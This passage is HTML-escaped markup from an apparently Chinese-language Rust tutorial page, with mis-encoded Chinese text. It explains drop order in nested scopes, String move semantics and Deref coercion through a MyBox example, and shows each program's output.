&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Drop&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Droppable&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">drop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">mut&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&amp;gt; Dropping &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">_a&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Droppable&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>: &lt;span class="s">&amp;#34;a&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// block A
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">_b&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Droppable&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>: &lt;span class="s">&amp;#34;b&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// block B
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">_c&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Droppable&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>: &lt;span class="s">&amp;#34;c&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">_d&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Droppable&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>: &lt;span class="s">&amp;#34;d&amp;#34;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Exiting block B&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Just exited block B&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Exiting block A&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Just exited block A&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// æ‰‹åŠ¨è§¦å‘ drop
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">drop&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_a&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;end of the main function&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">Exiting block B
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; Dropping d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; Dropping c
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Just exited block B
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Exiting block A
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; Dropping b
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Just exited block A
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; Dropping a
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">end of the main function
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h4 id="string-ç±»å‹">String ç±»å‹&lt;/h4>
&lt;p>æ‰§è¡Œ &lt;code>let s2 = s1;&lt;/code> æ—¶å‘ç”Ÿçš„äº‹æƒ…ï¼ˆå‚è€ƒä¸‹æ–¹çš„ String å†…å­˜å¸ƒå±€å›¾ï¼‰ï¼š&lt;/p>
&lt;ul>
&lt;li>ptr, len, capacity éƒ½æ˜¯å­˜å‚¨åœ¨ stack ä¸Šçš„ï¼Œå› æ­¤ä¼šç›´æ¥æ‹·è´ã€‚&lt;/li>
&lt;li>ptr æŒ‡å‘çš„å­—ç¬¦ä¸²æ•°æ®å­˜å‚¨åœ¨ heap ä¸Šï¼Œä¸ä¼šå‘ç”Ÿæ‹·è´ï¼Œè€Œæ˜¯è¢« &lt;em>move&lt;/em> äº†ã€‚&lt;/li>
&lt;/ul>
&lt;p>&lt;code>String s1&lt;/code> çš„å†…å­˜å¸ƒå±€ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/2023-07-16_07-16-48_trpl04-01.svg">
&lt;/figure>
&lt;h3 id="éšå«çš„è®¾è®¡ä¸Šçš„é€‰æ‹©">éšå«çš„è®¾è®¡ä¸Šçš„é€‰æ‹©&lt;/h3>
&lt;blockquote>
&lt;p>Rust æ°¸è¿œä¸ä¼šä¸ºä½ çš„æ•°æ®è‡ªåŠ¨åˆ›å»ºâ€œæ·±æ‹·è´â€ã€‚&lt;/p>
&lt;p>å› æ­¤ï¼Œä»»ä½•è‡ªåŠ¨å‘ç”Ÿçš„æ‹·è´éƒ½å¯ä»¥è®¤ä¸ºæ˜¯æˆæœ¬è¾ƒä½çš„ï¼ˆå°±è¿è¡Œæ—¶æ€§èƒ½è€Œè¨€ï¼‰ã€‚&lt;/p>
&lt;/blockquote>
&lt;h2 id="trait-å’Œè§£å¼•ç”¨--deref">Trait å’Œè§£å¼•ç”¨ (Deref)&lt;/h2>
&lt;p>é€šè¿‡å®ç° &lt;code>Deref&lt;/code> trait, å¯ä»¥è‡ªå®šä¹‰ç±»å‹çš„è§£å¼•ç”¨æ“ä½œç¬¦ (&lt;em>dereference operator&lt;/em>) &lt;code>*&lt;/code> çš„è¡Œä¸ºã€‚&lt;/p>
&lt;p>ä¸ä»…å¦‚æ­¤ï¼ŒRust è¿˜æ”¯æŒéšå¼ Deref å¼ºåˆ¶è½¬æ¢ (&lt;em>Deref Coercion&lt;/em>)ã€‚ä¸‹é¢é‡ç‚¹è§£é‡Šä¸€ä¸‹è¿™ä¸€æ¦‚å¿µã€‚&lt;/p>
&lt;h4 id="éšå¼-deref-å¼ºåˆ¶è½¬æ¢çš„ç‰¹ç‚¹">éšå¼ Deref å¼ºåˆ¶è½¬æ¢çš„ç‰¹ç‚¹&lt;/h4>
&lt;ul>
&lt;li>Deref coercion ä½œç”¨åœ¨å‡½æ•°å’Œæ–¹æ³•çš„å‚æ•°ä¸Šï¼Œå¯ä»¥è‡ªåŠ¨å°†ä¸€ç§ç±»å‹çš„å¼•ç”¨è½¬æ¢ä¸ºå¦ä¸€ç§ç±»å‹çš„å¼•ç”¨ã€‚è¦æ±‚è¢«è½¬æ¢çš„ç±»å‹å®ç°äº†å¯¹åº”çš„ &lt;code>Deref&lt;/code> traitã€‚&lt;/li>
&lt;li>Deref coercion å¯ä»¥æŒ‰éœ€è¿ç»­è½¬æ¢å¤šæ¬¡ï¼Œä»¥è·å¾—å‚æ•°æ‰€éœ€ç±»å‹çš„å¼•ç”¨ã€‚&lt;/li>
&lt;li>Deref coercion å‘ç”Ÿåœ¨ç¼–è¯‘æœŸï¼Œå› æ­¤æ²¡æœ‰é¢å¤–çš„è¿è¡Œæ—¶å¼€é”€ï¼ˆç¬¦åˆé›¶æˆæœ¬æŠ½è±¡åŸåˆ™ &lt;em>Zero
Cost Abstractions&lt;/em> ï¼‰ã€‚&lt;/li>
&lt;/ul>
&lt;h4 id="éšå¼-deref-å¼ºåˆ¶è½¬æ¢ç¤ºä¾‹">éšå¼ Deref å¼ºåˆ¶è½¬æ¢ç¤ºä¾‹&lt;/h4>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-rust" data-lang="rust">&lt;span class="line">&lt;span class="cl">&lt;span class="k">use&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">std&lt;/span>::&lt;span class="n">ops&lt;/span>::&lt;span class="n">Deref&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">struct&lt;/span> &lt;span class="nc">MyBox&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MyBox&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>: &lt;span class="nc">T&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="nc">MyBox&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="n">MyBox&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">impl&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">Deref&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MyBox&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">type&lt;/span> &lt;span class="nc">Target&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">T&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">deref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>-&amp;gt; &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="nc">Self&lt;/span>::&lt;span class="n">Target&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">need_a_ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="kt">i32&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">hello&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">name&lt;/span>: &lt;span class="kp">&amp;amp;&lt;/span>&lt;span class="kt">str&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">println!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Hello, &lt;/span>&lt;span class="si">{name}&lt;/span>&lt;span class="s">!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">fn&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MyBox&lt;/span>::&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="fm">assert_eq!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// è¿™é‡Œä¼ å‚æ—¶å‘ç”Ÿäº† Deref coercion, å°† &amp;amp;MyBox&amp;lt;i32&amp;gt; è‡ªåŠ¨è½¬æ¢æˆ &amp;amp;i32
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">need_a_ref&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="kd">let&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">MyBox&lt;/span>::&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">String&lt;/span>::&lt;span class="n">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Rust&amp;#34;&lt;/span>&lt;span class="p">));&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w"> &lt;/span>&lt;span class="c1">// ä¸‹é¢ä¸¤è¡Œæ˜¯ç­‰ä»·çš„
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">hello&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// ä½¿ç”¨äº†éšå¼ Deref å¼ºåˆ¶è½¬æ¢
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">hello&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="o">..&lt;/span>&lt;span class="p">]);&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="c1">// æœªä½¿ç”¨éšå¼ Deref å¼ºåˆ¶è½¬æ¢
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="w">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-text" data-lang="text">&lt;span class="line">&lt;span class="cl">5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hello, Rust!
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Hello, Rust!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
